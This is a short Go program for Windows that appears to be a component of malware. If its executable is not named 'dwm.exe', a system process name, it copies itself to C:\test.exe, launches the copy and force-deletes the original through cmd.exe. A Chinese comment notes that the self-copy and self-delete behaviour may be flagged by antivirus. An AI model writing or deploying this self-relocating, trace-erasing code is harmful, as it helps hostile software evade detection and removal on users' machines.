package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"io"
	//"fmt"
	"syscall"
)

var(
	sI syscall.StartupInfo
	pI syscall.ProcessInformation
)

func copy(src, dst string) error {
	if _, err := os.Stat(dst); os.IsNotExist(err) {
		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.Create(dst)
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		if err != nil {
			return err
		}
	}
	return nil
}

func fileDel(src string){
	argv := syscall.StringToUTF16Ptr(os.Getenv("windir")+"\\system32\\cmd.exe /C del /f /s /q "+src)
	err := syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return
	}
}


func main() {
	//自我复制与自我删除(选用)(可能会被查杀行为)
	cmd := "C:\\test.exe"
	src, _ := os.Executable()
	fName := filepath.Base(src)
	//fmt.Println(src)
	if fName != "dwm.exe" {
		copy(src, cmd)
		exec.Command(cmd).Start()
		fileDel(src)
		os.Exit(0)
	}
}